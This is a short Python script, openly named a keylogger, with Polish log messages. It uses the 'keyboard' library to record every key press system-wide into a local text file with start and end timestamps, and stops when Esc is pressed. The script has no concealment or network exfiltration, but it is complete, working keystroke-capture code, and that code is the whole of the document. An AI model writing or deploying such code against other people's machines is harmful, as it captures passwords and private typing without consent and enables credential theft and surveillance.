import keyboard
import time

def keylogger():
    log_file = "klawiatura_log.txt"
    with open(log_file, "w", encoding="utf -8") as f:
        f.write("Klawiatura zaczęła działać o {}\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if key == "esc":
                break
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("{}\n".format(key))

    with open(log_file, "a", encoding="utf-8") as f:
        f.write("Klawiatura zakończyła działanie o {}\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))

if __name__ == "__main__":
    keylogger()